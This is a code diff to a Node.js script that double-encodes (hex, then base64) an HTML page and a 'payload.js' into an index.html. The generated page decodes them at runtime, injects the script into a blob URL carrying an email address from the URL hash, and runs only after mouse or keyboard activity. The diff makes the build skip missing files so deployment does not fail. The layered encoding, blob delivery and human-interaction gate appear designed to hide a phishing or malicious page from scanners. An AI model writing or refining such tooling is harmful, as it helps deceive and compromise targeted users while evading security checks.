@@ -1,6 +1,5 @@
 const fs = require('fs');
 
-// --- 1. THE ENCODER FUNCTION (String -> Hex -> Base64) ---
 function doubleEncode(text) {
     let hex = '';
     for (let i = 0; i < text.length; i++) {
@@ -10,17 +9,23 @@ function doubleEncode(text) {
 }
 
 try {
-    // --- 2. READ YOUR PLAIN TEXT FILES ---
-    console.log('📖 Reading n1.html and payload.js...');
-    const htmlContent = fs.readFileSync('n1.html', 'utf8');
-    const jsContent = fs.readFileSync('payload.js', 'utf8');
+    const requiredFiles = ['n1.html'];
+    const missingFiles = requiredFiles.filter((file) => !fs.existsSync(file));
 
-    // --- 3. DOUBLE-ENCODE THEM ---
-    console.log('🔒 Encoding payloads...');
+    if (missingFiles.length > 0) {
+        console.warn(`⚠️ Required file(s) not found: ${missingFiles.join(', ')}. Skipping generation to avoid failing the workflow while preserving existing repository files.`);
+        process.exitCode = 0;
+        process.exit(0); // ✅ FIXED: Replaced 'return;' with 'process.exit(0);'
+    }
+
+    const htmlContent = fs.readFileSync('n1.html', 'utf8');
+    const jsContent = fs.existsSync('payload.js') 
+        ? fs.readFileSync('payload.js', 'utf8') 
+        : 'console.log("payload.js not provided; using empty payload.");';
+
     const htmlB64 = doubleEncode(htmlContent);
     const jsB64 = doubleEncode(jsContent);
 
-    // --- 4. BUILD THE FINAL INDEX.HTML ---
     const finalIndex = `<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -69,9 +74,10 @@ try {
             const emailFromHash = hash && hash.length > 1 ? decodeURIComponent(hash.slice(1)) : null;
 
             try {
+                // Safely escape </script> tags in the payload to prevent breaking the HTML
                 jsContent = jsContent.replace(/<\\/script>/gi, '<\\\\/script>');
                 const cleanHtml = htmlContent.replace(/<\\/head>/i, \`<script>\${jsContent}<\\/script></head>\`);
-                
+
                 const blob = new Blob([cleanHtml], { type: 'text/html' });
                 const blobUrl = URL.createObjectURL(blob);
                 const finalUrl = emailFromHash ? \`\${blobUrl}#\${emailFromHash}\` : blobUrl;
@@ -85,8 +91,9 @@ try {
         let hasRun = false;
         const execute = () => { if (!hasRun) { hasRun = true; init(); } };
 
-        if (humanInteraction) { execute(); } 
-        else {
+        if (humanInteraction) { 
+            execute(); 
+        } else {
             const triggerOnInteract = () => { if (!hasRun) execute(); };
             document.addEventListener('mousemove', triggerOnInteract, { once: true });
             document.addEventListener('keydown', triggerOnInteract, { once: true });
@@ -98,11 +105,10 @@ try {
 </body>
 </html>`;
 
-    // --- 5. SAVE THE OUTPUT ---
     fs.writeFileSync('index.html', finalIndex);
     console.log('✅ Success! index.html has been generated and is ready to deploy.');
-
+    
 } catch (error) {
     console.error('❌ Error:', error.message);
-    console.log('Make sure n1.html and payload.js exist in this folder!');
+    process.exitCode = 1;
 }
